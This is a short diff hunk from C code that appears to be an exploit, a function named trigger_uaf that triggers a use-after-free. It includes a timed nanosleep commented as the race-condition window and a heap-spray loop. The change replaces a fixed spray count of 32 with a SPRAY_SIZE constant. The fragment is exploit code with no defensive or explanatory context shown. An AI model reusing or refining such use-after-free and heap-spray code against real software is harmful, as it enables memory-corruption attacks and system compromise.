@@ -261,7 +261,7 @@ void trigger_uaf(struct opaque* o) {
     nanosleep(NANOSLEEP_50US, NULL); // Critical timing window for race condition
 
     int attempts = 0;
-    const int MAX_SPRAY = 32;
+    const int MAX_SPRAY = SPRAY_SIZE;
 
     while (attempts++ < 1000) {
         for (int i = 0; i < MAX_SPRAY; i++) {
